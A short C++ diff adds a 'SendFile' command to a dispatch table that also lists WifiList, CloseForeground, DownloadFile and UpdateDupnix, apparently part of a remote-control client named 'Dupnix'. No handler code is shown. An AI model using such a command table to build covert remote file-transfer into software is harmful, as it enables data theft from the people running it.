@@ -51,6 +51,7 @@ std::vector <std::pair<std::string, void(*)(std::string)>> functions{
 	{"WifiList", WifiList},
 	{"CloseForeground",TurnCloseForeground},
 	{"DownloadFile", DownloadFile},
+	{"SendFile", SendFile},
 	{"UpdateDupnix", UpdateDupnix}
 
 };
